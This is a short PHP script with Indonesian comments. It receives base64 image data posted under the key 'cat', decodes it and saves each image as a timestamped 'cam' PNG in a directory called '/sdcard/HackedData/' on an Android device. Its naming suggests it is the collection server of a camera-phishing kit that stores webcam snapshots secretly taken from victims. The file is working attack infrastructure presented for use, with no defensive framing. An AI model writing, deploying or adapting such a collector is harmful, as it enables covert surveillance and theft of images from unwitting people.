<?php
$date = date('dMYHis');  // Mendapatkan timestamp dengan format 26Oct2024123456
$imageData = $_POST['cat'];  // Mengambil data base64 dari request POST dengan key 'cat'

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");  // Mencatat di log bahwa data diterima
}

// Menghapus header base64
$filteredData = substr($imageData, strpos($imageData, ",") + 1);  
$unencodedData = base64_decode($filteredData);  // Decode base64 menjadi binary

// Direktori dan nama file di Android
$directory = '/sdcard/HackedData/';
$filename = 'cam' . $date . '.png';  

// Memastikan direktori ada sebelum menulis file
if (!is_dir($directory)) {
    mkdir($directory, 0777, true);  // Buat direktori dengan izin penuh jika belum ada
}

// Membuka file di direktori yang diinginkan
$fp = fopen($directory . $filename, 'wb');  
if ($fp) {
    fwrite($fp, $unencodedData);  // Tulis data gambar
    fclose($fp);  // Tutup file
    echo "File saved successfully!";
} else {
    echo "Failed to open file!";
}

exit();
?>
